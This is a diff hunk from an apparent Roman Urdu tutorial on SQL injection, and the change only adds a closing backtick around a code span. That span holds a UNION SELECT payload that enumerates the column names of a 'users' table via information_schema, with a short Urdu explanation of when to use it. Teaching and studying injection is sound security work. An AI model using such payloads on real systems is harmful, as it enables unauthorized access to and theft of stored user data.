@@ -58,7 +58,7 @@ Aik or baat yeh ky agar yeh command work na kare too phir column no change kiya 
 
 ### Checking Columns Name
 
-` ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
+` ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--`
 
 Yeh command table name find krny ky baad daali jati hai iss command sy column name ka pata chalta hai.
 
